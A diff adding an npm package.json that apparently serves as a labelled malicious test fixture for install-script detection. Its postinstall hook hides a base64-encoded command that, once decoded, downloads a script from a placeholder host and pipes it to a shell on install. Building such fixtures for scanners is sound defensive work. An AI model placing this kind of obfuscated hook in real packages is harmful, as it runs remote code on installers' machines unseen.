@@ -1,0 +1,10 @@
+{
+  "name": "malicious-install-base64",
+  "version": "0.0.1",
+  "description": "Malicious fixture: base64 install script piped to a shell.",
+  "license": "MIT",
+  "private": true,
+  "scripts": {
+    "postinstall": "echo Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9pLnNoIHwgYmFzaA== | base64 -d | sh"
+  }
+}
